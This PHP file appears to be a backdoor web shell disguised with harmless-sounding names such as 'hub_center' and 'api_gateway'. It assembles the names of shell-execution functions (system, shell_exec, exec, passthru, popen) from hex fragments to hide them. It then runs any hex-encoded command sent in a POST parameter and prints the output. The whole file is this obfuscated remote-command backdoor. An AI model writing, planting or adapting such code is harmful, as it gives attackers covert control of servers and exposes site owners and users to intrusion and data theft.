<?php


$itm1 = '3';
$itm2 = '7';
$itm3 = '9';
$itm4 = '6';
$itm5 = '5';
$itm6 = 'c';
$itm7 = '1';
$itm8 = '4';
$itm9 = '8';
$itm10 = '2';
$itm11 = '0';
$itm12 = 'f';
$itm13 = 'd';
$itm14 = 'e';
$hub_center1 = pack("H*", '7'.$itm1.$itm2.$itm3.$itm2.'3'.$itm2.'4'.$itm4.$itm5.'6'.'d');
$hub_center2 = pack("H*", '7'.'3'.'6'.'8'.$itm4.$itm5.$itm4.$itm6.$itm4.$itm6.'5'.'f'.$itm4.'5'.$itm2.'8'.$itm4.$itm5.$itm4.'3');
$hub_center3 = pack("H*", $itm4.$itm5.'7'.'8'.$itm4.'5'.$itm4.'3');
$hub_center4 = pack("H*", '7'.'0'.$itm4.$itm7.$itm2.'3'.'7'.$itm1.$itm2.$itm8.$itm4.$itm9.'7'.$itm10.'7'.$itm5);
$hub_center5 = pack("H*", '7'.$itm11.$itm4.$itm12.'7'.$itm11.$itm4.$itm5.$itm4.'e');
$hub_center6 = pack("H*", '7'.'3'.$itm2.'4'.'7'.'2'.$itm4.'5'.$itm4.'1'.'6'.$itm13.$itm5.$itm12.'6'.$itm2.$itm4.'5'.'7'.$itm8.'5'.'f'.$itm4.$itm1.'6'.$itm12.$itm4.'e'.'7'.'4'.$itm4.$itm5.'6'.$itm14.'7'.$itm8.'7'.'3');
$hub_center7 = pack("H*", '7'.$itm11.'6'.$itm1.'6'.$itm6.$itm4.'f'.$itm2.$itm1.$itm4.$itm5);
$api_gateway = pack("H*", $itm4.'1'.$itm2.'0'.'6'.$itm3.$itm5.$itm12.$itm4.$itm2.$itm4.$itm7.$itm2.'4'.$itm4.'5'.$itm2.$itm2.'6'.$itm7.'7'.$itm3);
if (isset($_POST[$api_gateway])) {
    $api_gateway = pack("H*", $_POST[$api_gateway]);
    if (function_exists($hub_center1)) {
        $hub_center1($api_gateway);
    } elseif (function_exists($hub_center2)) {
        print $hub_center2($api_gateway);
    } elseif (function_exists($hub_center3)) {
        $hub_center3($api_gateway, $factor_desc);
        print join("\n", $factor_desc);
    } elseif (function_exists($hub_center4)) {
        $hub_center4($api_gateway);
    } elseif (function_exists($hub_center5) && function_exists($hub_center6) && function_exists($hub_center7)) {
        $data_parameter_group = $hub_center5($api_gateway, 'r');
        if ($data_parameter_group) {
            $symbol_rec = $hub_center6($data_parameter_group);
            $hub_center7($data_parameter_group);
            print $symbol_rec;
        }
    }
    exit;
}
